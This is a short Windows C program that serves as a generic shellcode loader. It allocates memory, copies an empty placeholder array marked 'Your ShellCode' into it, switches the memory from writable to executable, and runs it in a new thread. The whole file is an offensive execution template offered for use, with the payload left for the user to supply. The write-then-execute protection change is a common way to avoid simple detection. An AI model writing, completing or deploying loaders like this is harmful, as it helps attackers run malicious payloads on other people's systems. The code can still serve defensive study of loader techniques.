#include <windows.h>
#include <stdio.h>
unsigned char shellcode[] = ""; // Your ShellCode
int main()
{
    LPVOID exec_mem;
    HANDLE thread;
    DWORD old_protect = 0;
    exec_mem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (exec_mem == NULL)
    {
        return -1;
    }
    memcpy(exec_mem, shellcode, sizeof(shellcode));
    if (!VirtualProtect(exec_mem, sizeof(shellcode), PAGE_EXECUTE_READ, &old_protect))
    {
        return -1;
    }
    thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    if (thread == NULL)
    {
        return -1;
    }
    WaitForSingleObject(thread, INFINITE);
    return 0;
}
